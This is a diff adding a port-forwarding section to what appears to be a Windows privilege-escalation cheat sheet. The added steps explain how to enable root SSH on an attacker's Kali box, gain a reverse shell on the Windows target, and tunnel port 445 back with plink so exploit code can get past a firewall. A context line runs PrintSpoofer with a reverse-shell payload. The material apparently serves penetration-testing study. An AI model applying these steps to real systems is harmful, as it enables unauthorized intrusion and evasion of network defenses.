@@ -367,7 +367,14 @@ PrintSpoofer.exe -i -c "C:\PrivEsc\reverse.exe"
 ```
 
 ## Port Forwarding
-
+1. Sometime you need to run exploit code on kali but there may be some firewall protection that prevents connection. Using port forwarding with ```plink.exe``` to allow the connection.
+2. On your own kali machine go to ```/etc/ssh/sshd_config``` and ```permitrootlogin``` set it to yes.
+3. ```service ssh restart```
+4. Gain a reverse shell on windows and run.
+5.run this on the windows terminal ```plink.exe root@<kali ip> -R 445:127.0.0.1:445```
+6. the -R should be like this ```<kali port>:<local win ip>:<window port>```
+7. Now ssh is established from windows port 445 to kali port 445.
+8. Now you can run your exploit code.
 
 ## Kernel Exploit (Last resort)
 ### Tools
